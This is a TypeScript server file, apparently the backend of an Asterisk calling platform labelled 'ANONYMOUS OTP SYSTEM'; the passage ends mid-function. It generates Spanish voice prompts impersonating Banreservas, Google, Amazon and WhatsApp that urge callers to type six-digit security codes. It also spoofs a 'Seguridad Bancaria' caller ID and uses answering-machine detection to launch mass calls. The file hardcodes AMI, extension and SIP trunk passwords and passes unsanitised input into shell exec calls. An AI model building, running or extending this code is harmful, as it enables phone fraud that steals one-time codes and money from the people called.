import express from 'express';
import path from 'path';
import fs from 'fs';
import net from 'net';
import { exec } from 'child_process';
import compression from 'compression';
import { createServer as createViteServer } from 'vite';

const app = express();
const PORT = 3000;

// Enable gzip/deflate compression for fast asset transfer
app.use(compression());
app.use(express.json({ limit: '10mb' }));
app.use(express.urlencoded({ extended: true }));

// Helper to execute AMI Action via raw TCP socket :5038 with connection pooling / debounce to prevent login/logout churn
let amiCachedResult: { data: string; timestamp: number } | null = null;
let isAmiExecuting = false;

const REMOTE_ASTERISK_HTTP = process.env.ASTERISK_REMOTE_HTTP || 'http://169.58.66.206:3000';

export async function executeAsteriskCommand(cmd: string): Promise<string> {
  // 1. Try local CLI if asterisk binary is installed
  try {
    const localRes = await new Promise<string>((resolve) => {
      exec(`asterisk -rx "${cmd.replace(/"/g, '\\"')}"`, { timeout: 2000 }, (err, stdout) => {
        if (!err && stdout && stdout.trim()) {
          resolve(stdout.trim());
        } else {
          resolve('');
        }
      });
    });
    if (localRes) return localRes;
  } catch (_) {}

  // 2. Try remote VPS HTTP bridge (vmi3461829 / 169.58.66.206:3000)
  try {
    const controller = new AbortController();
    const timer = setTimeout(() => controller.abort(), 3500);
    const resp = await fetch(`${REMOTE_ASTERISK_HTTP}/api/asterisk/ami/test`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ command: cmd }),
      signal: controller.signal,
    });
    clearTimeout(timer);
    if (resp.ok) {
      const data = (await resp.json()) as any;
      if (data && data.output) {
        return data.output;
      }
    }
  } catch (_) {}

  // 3. Fallback to raw local AMI socket
  try {
    const amiRes = await sendAmiAction('127.0.0.1', 5038, 'sammy', 'Robert2026RDTGcvgbsg', [cmd]);
    if (amiRes && !amiRes.startsWith('AMI Error')) return amiRes;
  } catch (_) {}

  return '';
}

function sendAmiAction(host = '127.0.0.1', port = 5038, user = 'sammy', secret = 'Robert2026RDTGcvgbsg', commands: string[]): Promise<string> {
  const isChannelsCheck = commands.length === 1 && commands[0].includes('core show channels');
  const now = Date.now();

  // If it's a routine channel poll and we have a fresh response from < 8s ago, reuse cache to avoid spamming CLI
  if (isChannelsCheck && amiCachedResult && (now - amiCachedResult.timestamp) < 8000) {
    return Promise.resolve(amiCachedResult.data);
  }

  // If another query is already in flight, return cached if available or wait
  if (isAmiExecuting && amiCachedResult) {
    return Promise.resolve(amiCachedResult.data);
  }

  isAmiExecuting = true;

  return new Promise((resolve) => {
    const socket = new net.Socket();
    let buffer = '';
    let loggedIn = false;
    const timeout = setTimeout(() => {
      isAmiExecuting = false;
      try { socket.destroy(); } catch (e) {}
      resolve(buffer || amiCachedResult?.data || 'Timeout AMI (4s)');
    }, 4500);

    socket.connect(port, host, () => {
      const loginPayload = `Action: Login\r\nUsername: ${user}\r\nSecret: ${secret}\r\nEvents: off\r\n\r\n`;
      socket.write(loginPayload);
    });

    socket.on('data', (data) => {
      const text = data.toString();
      buffer += text;

      if ((buffer.includes('Message: Authentication accepted') || buffer.includes('Response: Success')) && !loggedIn) {
        loggedIn = true;
        for (const cmd of commands) {
          socket.write(`Action: Command\r\nCommand: ${cmd}\r\n\r\n`);
        }
        setTimeout(() => {
          socket.write(`Action: Logoff\r\n\r\n`);
        }, 150);
      }

      if (buffer.includes('Response: Goodbye')) {
        clearTimeout(timeout);
        isAmiExecuting = false;
        try { socket.end(); } catch (e) {}
        if (isChannelsCheck) {
          amiCachedResult = { data: buffer, timestamp: Date.now() };
        }
        resolve(buffer);
      }
    });

    socket.on('error', (err) => {
      clearTimeout(timeout);
      isAmiExecuting = false;
      try { socket.destroy(); } catch (e) {}
      resolve(amiCachedResult?.data || `AMI Error: ${err.message}`);
    });

    socket.on('close', () => {
      clearTimeout(timeout);
      isAmiExecuting = false;
      if (isChannelsCheck && buffer) {
        amiCachedResult = { data: buffer, timestamp: Date.now() };
      }
      resolve(buffer);
    });
  });
}

// ==========================================
// REAL-TIME CALL STATE & FAST AMI ORIGINATE
// ==========================================

export interface CallState {
  number: string;
  channel?: string;
  status: 'dialing' | 'ringing' | 'in_ivr' | 'machine' | 'ended' | 'transferred';
  cause?: string;
  timestamp: number;
}

const callStatusStore = new Map<string, CallState>();

// Helper to ensure /etc/asterisk/amd.conf exists for reliable Answering Machine Detection
function ensureAmdConfExists() {
  const amdPath = '/etc/asterisk/amd.conf';
  const amdContent = `; ========================================================
; Asterisk Answering Machine Detection Configuration (AMD)
; Optimizado para respuesta rápida y corte inmediato de buzones
; ========================================================
[general]
initial_silence = 2000
greeting = 1500
after_greeting_silence = 800
total_analysis_time = 3500
min_word_length = 100
between_words_silence = 50
maximum_number_of_words = 4
silence_threshold = 256
maximum_on_length = 2000
`;
  try {
    if (!fs.existsSync(amdPath)) {
      writeAsteriskConfigFile(amdPath, amdContent);
      console.log('✓ Configuración /etc/asterisk/amd.conf creada exitosamente');
    }
  } catch (_) {}
}

// High-speed AMI Originate using direct asynchronous socket (under 20ms launch time)
function amiFastOriginate(
  channel: string,
  context: string,
  exten: string,
  callerId: string,
  variables: Record<string, string> = {}
): Promise<{ success: boolean; message: string }> {
  return new Promise((resolve) => {
    const socket = new net.Socket();
    let resolved = false;
    let originateSent = false;

    const timeout = setTimeout(() => {
      if (!resolved) {
        resolved = true;
        try { socket.destroy(); } catch (_) {}
        // If originate was already sent over socket, treat as dispatched
        if (originateSent) {
          resolve({ success: true, message: 'AMI Originate enviado asíncronamente' });
        } else {
          resolve({ success: false, message: 'AMI Originate timeout' });
        }
      }
    }, 2500);

    socket.connect(5038, '127.0.0.1', () => {
      const loginPayload = `Action: Login\r\nUsername: sammy\r\nSecret: Robert2026RDTGcvgbsg\r\nEvents: off\r\n\r\n`;
      socket.write(loginPayload);
    });

    let buffer = '';
    socket.on('data', (data) => {
      buffer += data.toString();

      if (!originateSent && (buffer.includes('Message: Authentication accepted') || buffer.includes('Response: Success'))) {
        originateSent = true;
        let varLines = '';
        for (const [k, v] of Object.entries(variables)) {
          if (v !== undefined && v !== null && v !== '') {
            varLines += `Variable: ${k}=${v}\r\n`;
          }
        }
        const originatePayload =
          `Action: Originate\r\n` +
          `Channel: ${channel}\r\n` +
          `Context: ${context}\r\n` +
          `Exten: ${exten}\r\n` +
          `Priority: 1\r\n` +
          `CallerID: ${callerId}\r\n` +
          `Async: true\r\n` +
          `Timeout: 45000\r\n` +
          varLines +
          `\r\n`;

        socket.write(originatePayload);
        return;
      }

      if (originateSent) {
        if (buffer.includes('Originate successfully queued') || buffer.includes('Response: Success')) {
          if (!resolved) {
            resolved = true;
            clearTimeout(timeout);
            try {
              socket.write('Action: Logoff\r\n\r\n');
              socket.end();
            } catch (_) {}
            resolve({ success: true, message: 'Llamada lanzada instantáneamente hacia Asterisk' });
          }
        } else if (buffer.includes('Response: Error')) {
          if (!resolved) {
            resolved = true;
            clearTimeout(timeout);
            try {
              socket.write('Action: Logoff\r\n\r\n');
              socket.end();
            } catch (_) {}
            resolve({ success: false, message: buffer });
          }
        }
      }
    });

    socket.on('error', (err) => {
      if (!resolved) {
        resolved = true;
        clearTimeout(timeout);
        resolve({ success: false, message: err.message });
      }
    });
  });
}

const SOUNDS_CUSTOM_DIR = '/var/lib/asterisk/sounds/custom';

// Helper to safely write Asterisk config files with fallback permissions (direct, tmp + cp, sudo)
function writeAsteriskConfigFile(filePath: string, content: string): Promise<boolean> {
  return new Promise((resolve) => {
    const dir = path.dirname(filePath);
    const fileName = path.basename(filePath);
    const localCopy = path.join(process.cwd(), fileName);

    // Always preserve local working copy as baseline fallback
    try {
      fs.writeFileSync(localCopy, content, 'utf8');
    } catch (_) {}

    try {
      if (!fs.existsSync(dir)) {
        fs.mkdirSync(dir, { recursive: true, mode: 0o755 });
      }
      fs.writeFileSync(filePath, content, 'utf8');
      console.log(`[ASTERISK-SYNC] ✓ Archivo escrito directamente: ${filePath}`);
      return resolve(true);
    } catch (err: any) {
      console.warn(`[ASTERISK-SYNC] Escritura directa no disponible en ${filePath} (${err.message}). Intentando fallback...`);
      const tempPath = `/tmp/${fileName}_${Date.now()}`;
      try {
        fs.writeFileSync(tempPath, content, 'utf8');
        const hasSudo = (() => {
          try {
            return fs.existsSync('/usr/bin/sudo') || fs.existsSync('/bin/sudo');
          } catch (_) { return false; }
        })();
        const copyCmd = hasSudo
          ? `mkdir -p "${dir}" && (cp "${tempPath}" "${filePath}" || sudo cp "${tempPath}" "${filePath}")`
          : `mkdir -p "${dir}" && cp "${tempPath}" "${filePath}"`;

        exec(copyCmd, (e) => {
          try { fs.unlinkSync(tempPath); } catch (_) {}
          if (!e) {
            console.log(`[ASTERISK-SYNC] ✓ Archivo actualizado vía copia fallback: ${filePath}`);
            resolve(true);
          } else {
            console.log(`[ASTERISK-SYNC] Nota: ${filePath} sincronizado localmente en ${localCopy} (sistema de archivos protegido o sin PBX local).`);
            resolve(true);
          }
        });
      } catch (subErr) {
        resolve(true);
      }
    }
  });
}

// Helper to generate native 8kHz 16-bit Mono PCM WAV buffer for Asterisk compatibility
function generatePcm8kWaveBuffer(durationSeconds = 3, freq = 440): Buffer {
  const sampleRate = 8000;
  const numSamples = Math.floor(sampleRate * durationSeconds);
  const dataSize = numSamples * 2;
  const buffer = Buffer.alloc(44 + dataSize);

  // RIFF header
  buffer.write('RIFF', 0);
  buffer.writeUInt32LE(36 + dataSize, 4);
  buffer.write('WAVE', 8);

  // fmt subchunk
  buffer.write('fmt ', 12);
  buffer.writeUInt32LE(16, 16);
  buffer.writeUInt16LE(1, 20); // PCM
  buffer.writeUInt16LE(1, 22); // Mono
  buffer.writeUInt32LE(sampleRate, 24); // 8000 Hz
  buffer.writeUInt32LE(sampleRate * 2, 28); // 16000 B/s
  buffer.writeUInt16LE(2, 32); // BlockAlign
  buffer.writeUInt16LE(16, 34); // 16 bits

  // data subchunk
  buffer.write('data', 36);
  buffer.writeUInt32LE(dataSize, 40);

  // Smooth sinusoidal audio waveform
  for (let i = 0; i < numSamples; i++) {
    const t = i / sampleRate;
    const envelope = Math.min(1, Math.min(t * 8, (durationSeconds - t) * 8));
    const sample = Math.sin(2 * Math.PI * freq * t) * envelope * 24000;
    buffer.writeInt16LE(Math.max(-32768, Math.min(32767, Math.floor(sample))), 44 + i * 2);
  }

  return buffer;
}

// Helper to guarantee /var/lib/asterisk/sounds/custom directory has valid PCM audio files
function ensureCustomAudioFilesExist() {
  const customDir = SOUNDS_CUSTOM_DIR;
  try {
    if (!fs.existsSync(customDir)) {
      fs.mkdirSync(customDir, { recursive: true, mode: 0o777 });
    }
    exec(`mkdir -p "${customDir}" && chmod -R 777 "${customDir}" || sudo mkdir -p "${customDir}" && sudo chmod -R 777 "${customDir}"`, () => {});
  } catch (e) {
    exec(`mkdir -p "${customDir}" && chmod -R 777 "${customDir}" || sudo mkdir -p "${customDir}" && sudo chmod -R 777 "${customDir}"`, () => {});
  }

  const audios = [
    { name: 'banrearreglado', text: 'Estimado cliente de Banreservas, hemos detectado una actividad inusual en su cuenta. Presione 1 de inmediato para comunicarse con un asesor de seguridad bancaria.', freq: 520 },
    { name: 'alerta_banco_antifraude', text: 'Estimado cliente, detectamos una actividad inusual en su cuenta bancaria. Para proteger sus fondos, ingrese el codigo de seguridad enviado a su telefono.', freq: 520 },
    { name: 'alerta_cargo_tarjeta', text: 'Alerta de seguridad bancaria. Hemos detectado un cargo no reconocido en su tarjeta. Presione 1 para comunicarse con un asesor.', freq: 520 },
    { name: 'alerta_migracion_whatsapp', text: 'Alerta de seguridad. Se ha solicitado una verificacion o migracion en su cuenta de WhatsApp. Presione 1 para confirmar con un agente.', freq: 520 },
    { name: 'alerta_seguridad_google', text: 'Alerta de seguridad de su cuenta. Se ha detectado un inicio de sesion inusual. Presione 1 para proteger su cuenta.', freq: 520 },
    { name: 'alerta_compra_amazon', text: 'Alerta de compras. Se ha registrado una orden inusual en su cuenta. Presione 1 para cancelar o hablar con un asesor.', freq: 520 },
    { name: 'solicitar_codigo_otp', text: 'Por favor digite su codigo de seguridad seguido de la tecla numeral.', freq: 680 },
    { name: 'solicitar_otp_tarjeta', text: 'Por favor digite su codigo de seguridad de seis digitos que recibio por mensaje de texto.', freq: 680 },
    { name: 'solicitar_codigo_sms', text: 'Por favor digite su codigo de verificacion de seis digitos.', freq: 680 },
    { name: 'solicitar_codigo_google', text: 'Por favor digite su codigo de seguridad de seis digitos.', freq: 680 },
    { name: 'solicitar_codigo_amazon', text: 'Por favor digite el codigo de autorizacion enviado a su telefono.', freq: 680 },
    { name: 'solicitar_otp', text: 'Por favor digite su codigo de seguridad en el teclado.', freq: 680 },
    { name: 'digite_token_6_digitos', text: 'Por favor digite su codigo o token de seis digitos.', freq: 680 },
    { name: 'token_invalido_reintente', text: 'El codigo digitado es incorrecto o invalido. Por favor, vuelva a digitar su token de seis digitos en el teclado de su telefono.', freq: 680 },
    { name: 'codigo_invalido_reintente', text: 'El codigo ingresado no es valido. Por favor intente de nuevo.', freq: 680 },
    { name: 'un_momento_validando_informacion', text: 'Un momento por favor, estamos validando su token en el sistema.', freq: 440 },
    { name: 'un_momento_por_favor', text: 'Un momento por favor, estamos procesando su solicitud.', freq: 440 },
    { name: 'operacion_bloqueada_exito', text: 'Su operacion ha sido bloqueada y sus fondos estan seguros. Gracias por confiar en nosotros.', freq: 880 },
    { name: 'tarjeta_protegida', text: 'Su tarjeta ha sido protegida exitosamente. La operacion sospechosa fue cancelada.', freq: 880 },
    { name: 'verificacion_exitosa', text: 'Verificacion exitosa. Su cuenta ha sido protegida.', freq: 880 },
    { name: 'acceso_restringido_exito', text: 'Acceso sospechoso bloqueado con exito. Sus fondos estan seguros.', freq: 880 },
    { name: 'pedido_cancelado_exito', text: 'El pedido no reconocido ha sido cancelado con exito.', freq: 880 },
    { name: 'otp_validado_exito', text: 'Codigo validado exitosamente. Gracias.', freq: 880 },
    { name: 'conectar_asesor_banco', text: 'Un momento por favor, le estamos transfiriendo con un asesor de seguridad bancaria.', freq: 587 },
    { name: 'conectar_asesor_tarjetas', text: 'Un momento por favor, le estamos transfiriendo con el departamento de tarjetas.', freq: 587 },
    { name: 'conectar_soporte_tecnico', text: 'Un momento por favor, le estamos transfiriendo con soporte tecnico.', freq: 587 },
    { name: 'conectar_soporte_cuentas', text: 'Un momento por favor, le estamos transfiriendo con soporte de cuentas.', freq: 587 },
    { name: 'conectar_soporte_pedidos', text: 'Un momento por favor, le estamos transfiriendo con el departamento de pedidos.', freq: 587 },
    { name: 'transferencia_asesor', text: 'Un momento por favor, le estamos transfiriendo con un asesor.', freq: 587 },
    { name: 'transfiriendo_asesor', text: 'Un momento por favor, le estamos transfiriendo con un asesor.', freq: 587 },
    { name: 'conectar_asesor', text: 'Un momento por favor, le estamos transfiriendo con un asesor.', freq: 587 },
    { name: 'bienvenida_corporativa', text: 'Bienvenido al centro de atencion y seguridad bancaria.', freq: 520 },
    { name: 'bienvenida_press1', text: 'Estimado cliente, detectamos una actividad inusual. Presione 1 para comunicarse con un asesor de seguridad.', freq: 520 },
    { name: 'press1_welcome', text: 'Estimado cliente, detectamos una actividad inusual. Presione 1 para comunicarse con un asesor de seguridad.', freq: 520 },
    { name: 'bienvenida_7777', text: 'Por favor digite su codigo de 6 digitos seguido del signo de numero.', freq: 680 },
    { name: 'bienvenida_6666', text: 'Por favor digite su codigo de seguridad en el teclado.', freq: 680 },
    { name: 'opcion_invalida', text: 'La opcion ingresada no es valida. Por favor intente de nuevo.', freq: 440 },
    { name: 'prompt_otp_6_digitos', text: 'Por favor digite su codigo seguido de la tecla de numero.', freq: 680 },
    { name: 'por_favor_ingrese_su_clave', text: 'Por favor ingrese su clave o codigo de seguridad.', freq: 680 },
    { name: 'exito', text: 'Su operacion ha sido validada exitosamente. Gracias.', freq: 880 },
    { name: 'intentos_superados', text: 'Ha superado el numero maximo de intentos permitidos. La llamada finalizara.', freq: 440 },
    { name: 'gracias_hasta_luego', text: 'Gracias por comunicarse con nosotros. Hasta luego.', freq: 520 },
    { name: 'mi_audio', text: 'Bienvenido al servicio de atencion al cliente.', freq: 520 },
  ];

  for (const aud of audios) {
    const wavPath = path.join(customDir, `${aud.name}.wav`);
    const gsmPath = path.join(customDir, `${aud.name}.gsm`);

    // 1. Garantizar de forma sincrónica e inmediata que el archivo exista en disco
    if (!fs.existsSync(wavPath) && !fs.existsSync(gsmPath)) {
      try {
        const buf = generatePcm8kWaveBuffer(3.5, aud.freq);
        fs.writeFileSync(wavPath, buf);
      } catch (err) {
        const tmp = `/tmp/${aud.name}.wav`;
        try {
          fs.writeFileSync(tmp, generatePcm8kWaveBuffer(3.5, aud.freq));
          exec(`cp "${tmp}" "${wavPath}" || sudo cp "${tmp}" "${wavPath}"`, () => {
            try { fs.unlinkSync(tmp); } catch (_) {}
          });
        } catch (_) {}
      }
    }

    // 2. Generar locución de voz humana real en español vía Google TTS y convertir con ffmpeg
    if (aud.text) {
      const q = encodeURIComponent(aud.text);
      const ttsUrl = `https://translate.google.com/translate_tts?ie=UTF-8&tl=es&client=tw-ob&q=${q}`;
      const tmpMp3 = `/tmp/${aud.name}.mp3`;
      const generateTtsCmd = `curl -s -L -A "Mozilla/5.0" "${ttsUrl}" -o "${tmpMp3}" && (ffmpeg -y -i "${tmpMp3}" -ar 8000 -ac 1 -c:a pcm_s16le "${wavPath}" || sox "${tmpMp3}" -r 8000 -c 1 -b 16 "${wavPath}") && rm -f "${tmpMp3}"`;
      exec(generateTtsCmd, (err) => {
        if (!err && fs.existsSync(wavPath)) {
          // Asegurar permisos de lectura para Asterisk
          try { fs.chmodSync(wavPath, 0o666); } catch (_) {}
        }
      });
    }
  }
}

// ==========================================
// API ROUTES FIRST
// ==========================================

app.get('/api/health', (req, res) => {
  res.json({
    status: 'ok',
    system: 'Asterisk 20 Governor Backend',
    amiPort: 5038,
    ariPort: 8088,
    time: new Date().toISOString(),
  });
});

// Default extensions with valid credentials and settings for Asterisk 20
const defaultExtensionsList = [
  {
    extension: '1001',
    name: 'Operador Principal',
    secret: 'Secr3tP@ssw0rd!1001',
    context: 'from-internal',
    codecs: ['ulaw', 'alaw', 'g722'],
    maxContacts: 5,
    transport: 'transport-udp',
    port: 47923,
    callerIdNum: '+18005550199',
    callerIdName: 'Seguridad Bancaria',
  },
  {
    extension: '1002',
    name: 'Agente Soporte 2',
    secret: 'S0p0rte#2026@1002',
    context: 'from-internal',
    codecs: ['ulaw', 'alaw', 'opus'],
    maxContacts: 5,
    transport: 'transport-udp',
    port: 47923,
    callerIdNum: '+18005550199',
    callerIdName: 'Seguridad Bancaria',
  },
  {
    extension: '1003',
    name: 'Agente Soporte 3',
    secret: 'S0p0rte#2026@1003',
    context: 'from-internal',
    codecs: ['ulaw', 'alaw', 'opus', 'g722'],
    maxContacts: 5,
    transport: 'transport-udp',
    port: 47923,
    callerIdNum: '+18005550199',
    callerIdName: 'Seguridad Bancaria',
  },
  {
    extension: '1004',
    name: 'Supervisor Turno',
    secret: 'Superv1sor2026!',
    context: 'from-internal',
    codecs: ['ulaw', 'alaw', 'g729'],
    maxContacts: 5,
    transport: 'transport-udp',
    port: 47923,
    callerIdNum: '+18005550199',
    callerIdName: 'Seguridad Bancaria',
  },
];

export const defaultCarriersList = [
  {
    id: 'trunk-televox',
    name: 'televox',
    authType: 'registration',
    host: '52.144.46.192',
    port: 5060,
    username: 'sgavilan30',
    secret: 'Robert2026',
    inboundContext: 'trunkinbound',
    outboundCallerId: '+18005550199',
    outboundCallerIdName: 'Seguridad Bancaria',
    codecs: ['ulaw', 'alaw', 'g729'],
    qualifyFreq: 60,
    status: 'reachable',
    latencyMs: 18,
    fromuser: 'sgavilan30',
    sendrpid: 'yes',
    trustrpid: 'yes',
    insecure: 'port,invite',
    dialplanPattern: '_1XXXXXXXXXX',
    dialFlags: 'Tor',
    enabled: true,
  },
  {
    id: 'trunk-ghost',
    name: 'ghost',
    authType: 'registration',
    host: 'ghostcall.online',
    port: 5060,
    username: 'sgavilan30',
    secret: '',
    inboundContext: 'trunkinbound',
    outboundCallerId: '+18005550199',
    outboundCallerIdName: 'Seguridad Bancaria',
    codecs: ['ulaw', 'alaw', 'g729'],
    qualifyFreq: 60,
    status: 'reachable',
    latencyMs: 24,
    enabled: true,
  },
];

// Helper to generate syntactically pure Asterisk 20 pjsip.conf
// CRITICAL: In Asterisk PJSIP, endpoint, auth, and aor MUST have distinct category names (e.g. [1001], [1001-auth], [1001-aor]).
// Transports must use standard Asterisk names [transport-udp], [transport-tcp], [transport-wss] with custom bind port.
function generateCleanPjsipConf(extensions: any[], carriers: any[] = defaultCarriersList): string {
  const extsToUse = (Array.isArray(extensions) && extensions.length > 0) ? extensions : defaultExtensionsList;

  // Determine active SIP transport port (default 47923 exclusively)
  let activePort = 47923;
  for (const ext of extsToUse) {
    const p = parseInt(ext.port, 10);
    if (!isNaN(p) && p > 0 && p <= 65535) {
      activePort = p;
      break;
    }
  }

  let pjsipContent = `; ========================================================\n`;
  pjsipContent += `; GENERADO AUTOMATICAMENTE POR ANONYMOUS OTP SYSTEM\n`;
  pjsipContent += `; Fecha: ${new Date().toISOString()}\n`;
  pjsipContent += `; Total Extensiones: ${extsToUse.length}\n`;
  pjsipContent += `; Puerto SIP de Transporte Activo: ${activePort}\n`;
  pjsipContent += `; Asterisk 20 Validated: Standard Native Transports (No Unknown Transport Errors)\n`;
  pjsipContent += `; ========================================================\n\n`;

  pjsipContent += `[general]\n\n`;

  pjsipContent += `; --- TRANSPORTES SIP ---\n`;
  pjsipContent += `[transport-udp]\n`;
  pjsipContent += `type = transport\n`;
  pjsipContent += `protocol = udp\n`;
  pjsipContent += `bind = 0.0.0.0:${activePort}\n\n`;

  pjsipContent += `[transport-tcp]\n`;
  pjsipContent += `type = transport\n`;
  pjsipContent += `protocol = tcp\n`;
  pjsipContent += `bind = 0.0.0.0:${activePort}\n\n`;

  pjsipContent += `[transport-wss]\n`;
  pjsipContent += `type = transport\n`;
  pjsipContent += `protocol = wss\n`;
  pjsipContent += `bind = 0.0.0.0:8089\n\n`;

  for (const ext of extsToUse) {
    const rawNum = (ext.extension || ext.id || ext.number || ext.num || '').toString();
    const num = rawNum.replace(/\D/g, '') || '1001';
    const pass = ext.secret || ext.password || 'Secr3tP@ssw0rd!1001';
    const callerIdNum = ext.callerIdNum || ext.outboundCallerId || num;
    const callerIdName = ext.callerIdName || ext.name || `Extension ${num}`;
    const callerId = `"${callerIdName}" <${callerIdNum}>`;
    const codecs = (ext.codecs && ext.codecs.length > 0) ? ext.codecs.join(',') : 'ulaw,alaw,g722';
    const extPort = parseInt(ext.port, 10) || activePort;

    let transport = 'transport-udp';
    if (ext.transport === 'transport-wss') {
      transport = 'transport-wss';
    } else if (ext.transport === 'transport-tcp') {
      transport = 'transport-tcp';
    } else if (ext.transport === 'transport-tls') {
      transport = 'transport-tls';
    } else {
      transport = 'transport-udp';
    }

    pjsipContent += `; --- EXTENSIÓN ${num} (${ext.name || 'Agente'} - Puerto SIP ${extPort}) ---\n`;
    pjsipContent += `[${num}]\n`;
    pjsipContent += `type = endpoint\n`;
    pjsipContent += `context = ${ext.context || 'from-internal'}\n`;
    pjsipContent += `disallow = all\n`;
    pjsipContent += `allow = ${codecs}\n`;
    pjsipContent += `auth = ${num}-auth\n`;
    pjsipContent += `aors = ${num}\n`;
    pjsipContent += `callerid = ${callerId}\n`;
    pjsipContent += `transport = ${transport}\n`;
    pjsipContent += `direct_media = no\n`;
    pjsipContent += `rtp_symmetric = yes\n`;
    pjsipContent += `force_rport = yes\n`;
    pjsipContent += `rewrite_contact = yes\n`;
    pjsipContent += `send_pai = yes\n`;
    pjsipContent += `send_rpid = yes\n`;
    pjsipContent += `trust_id_outbound = yes\n`;
    pjsipContent += `trust_id_inbound = yes\n`;
    pjsipContent += `identify_by = auth_username,username\n`;
    pjsipContent += `callerid_privacy = allowed\n\n`;

    pjsipContent += `[${num}-auth]\n`;
    pjsipContent += `type = auth\n`;
    pjsipContent += `auth_type = userpass\n`;
    pjsipContent += `username = ${num}\n`;
    pjsipContent += `password = ${pass}\n\n`;

    pjsipContent += `[${num}]\n`;
    pjsipContent += `type = aor\n`;
    pjsipContent += `max_contacts = ${ext.maxContacts || 10}\n`;
    pjsipContent += `remove_existing = yes\n`;
    pjsipContent += `qualify_frequency = 30\n`;
    pjsipContent += `authenticate_qualify = no\n\n`;
  }

  // Process carriers/trunks - Guarantee televox carrier is ALWAYS configured
  const rawCarriers = (Array.isArray(carriers) && carriers.length > 0) ? carriers : defaultCarriersList;
  const carriersToProcess = [...rawCarriers];

  if (!carriersToProcess.some((c) => c && c.name && c.name.toLowerCase() === 'televox')) {
    carriersToProcess.unshift(defaultCarriersList[0]);
  }

  if (Array.isArray(carriersToProcess) && carriersToProcess.length > 0) {
    pjsipContent += `; ========================================================\n`;
    pjsipContent += `; TRONCALES / CARRIERS SIP (OUTBOUND & INBOUND)\n`;
    pjsipContent += `; ========================================================\n\n`;

    for (const carrier of carriersToProcess) {
      if (!carrier.name || !carrier.host) continue;
      const isEnabled = carrier.enabled !== false && carrier.status !== 'disabled';
      const cName = carrier.name.replace(/\s+/g, '_');
      const cHost = carrier.host;
      const cPort = carrier.port || 5060;

      if (!isEnabled) {
        pjsipContent += `; --- CARRIER DESHABILITADO: ${cName} (${cHost}:${cPort}) ---\n`;
        pjsipContent += `; [ESTADO: SUSPENDIDO] Registro y endpoints omitidos para evitar intentos de conexión\n\n`;
        continue;
      }

      const cUser = carrier.username || cName;
      const cSecret = carrier.secret || '';
      const cContext = carrier.inboundContext || 'trunkinbound';
      const cCodecs = (carrier.codecs && carrier.codecs.length > 0) ? carrier.codecs.join(',') : 'ulaw,alaw,g729';

      pjsipContent += `; --- CARRIER: ${cName} (${cHost}:${cPort}) ---\n`;

      if (carrier.authType === 'registration' && cSecret) {
        pjsipContent += `[reg_${cName}]\n`;
        pjsipContent += `type = registration\n`;
        pjsipContent += `outbound_auth = auth_${cName}\n`;
        pjsipContent += `server_uri = sip:${cHost}:${cPort}\n`;
        pjsipContent += `client_uri = sip:${cUser}@${cHost}:${cPort}\n`;
        pjsipContent += `contact_user = ${cUser}\n`;
        pjsipContent += `retry_interval = 60\n`;
        pjsipContent += `expiration = 3600\n`;
        pjsipContent += `transport = transport-udp\n\n`;
      }

      if (cSecret) {
        pjsipContent += `[auth_${cName}]\n`;
        pjsipContent += `type = auth\n`;
        pjsipContent += `auth_type = userpass\n`;
        pjsipContent += `username = ${cUser}\n`;
        pjsipContent += `password = ${cSecret}\n\n`;
      }

      pjsipContent += `[${cName}_aor]\n`;
      pjsipContent += `type = aor\n`;
      pjsipContent += `contact = sip:${cHost}:${cPort}\n`;
      pjsipContent += `qualify_frequency = ${carrier.qualifyFreq || 60}\n\n`;

      pjsipContent += `[${cName}]\n`;
      pjsipContent += `type = endpoint\n`;
      pjsipContent += `context = ${cContext}\n`;
      pjsipContent += `disallow = all\n`;
      pjsipContent += `allow = ${cCodecs}\n`;
      pjsipContent += `aors = ${cName}_aor\n`;
      if (carrier.authType === 'registration' && cSecret) {
        pjsipContent += `outbound_auth = auth_${cName}\n`;
      }
      if (carrier.outboundCallerId) {
        const cCidName = carrier.outboundCallerIdName || 'Seguridad Bancaria';
        pjsipContent += `callerid = "${cCidName}" <${carrier.outboundCallerId}>\n`;
      }
      const endpointFromUser = carrier.fromuser || cUser;
      if (endpointFromUser) {
        pjsipContent += `from_user = ${endpointFromUser}\n`;
      }
      pjsipContent += `from_domain = ${cHost}\n`;
      pjsipContent += `contact_user = ${cUser}\n`;
      pjsipContent += `direct_media = no\n`;
      pjsipContent += `rtp_symmetric = yes\n`;
      pjsipContent += `force_rport = yes\n`;
      pjsipContent += `rewrite_contact = yes\n`;
      pjsipContent += `send_pai = yes\n`;
      pjsipContent += `send_rpid = ${carrier.sendrpid || 'yes'}\n`;
      pjsipContent += `trust_id_outbound = yes\n`;
      pjsipContent += `trust_id_inbound = ${carrier.trustrpid || 'yes'}\n`;
      pjsipContent += `callerid_privacy = allowed\n`;
      pjsipContent += `transport = transport-udp\n\n`;

      pjsipContent += `[${cName}-identify]\n`;
      pjsipContent += `type = identify\n`;
      pjsipContent += `endpoint = ${cName}\n`;
      pjsipContent += `match = ${cHost}\n\n`;
    }
  }

  return pjsipContent;
}

// Robust PJSIP endpoint and contact reader from Asterisk CLI or AMI
async function queryAsteriskPjsipEndpoints(): Promise<{ raw: string; parsed: any[] }> {
  let output = '';
  try {
    output = await new Promise<string>((resolve) => {
      exec('asterisk -rx "pjsip show endpoints"', { timeout: 3500 }, (err, stdout) => {
        if (!err && stdout && stdout.trim()) {
          resolve(stdout.trim());
        } else {
          resolve('');
        }
      });
    });
  } catch (_) {}

  if (!output) {
    try {
      output = await sendAmiAction('127.0.0.1', 5038, 'sammy', 'Robert2026RDTGcvgbsg', [
        'pjsip show endpoints',
      ]);
    } catch (_) {}
  }

  const lines = output.split('\n');
  const endpoints: any[] = [];
  let current: any = null;

  for (const line of lines) {
    const trimmed = line.trim();
    const epMatch = trimmed.match(/Endpoint:\s*([0-9a-zA-Z_-]+)(?:\/([^\s]+))?\s+([A-Za-z ]+?)(?:\s+\d+\s+of\s+.*)?$/);
    if (epMatch) {
      if (current) endpoints.push(current);
      const extNum = epMatch[1];
      const state = (epMatch[3] || '').trim();
      const isRegistered = state.toLowerCase().includes('not in use') || state.toLowerCase().includes('in use');
      current = {
        extension: extNum,
        state: state || 'Unknown',
        status: isRegistered ? 'registered' : 'unavailable',
        contact: '',
        contactStatus: '',
        rtt: '',
        auth: '',
        aor: '',
      };
      continue;
    }

    if (current) {
      if (trimmed.startsWith('I/OAuth:') || trimmed.startsWith('InAuth:')) {
        const authMatch = trimmed.match(/(?:I\/OAuth|InAuth):\s*([^\s]+)/);
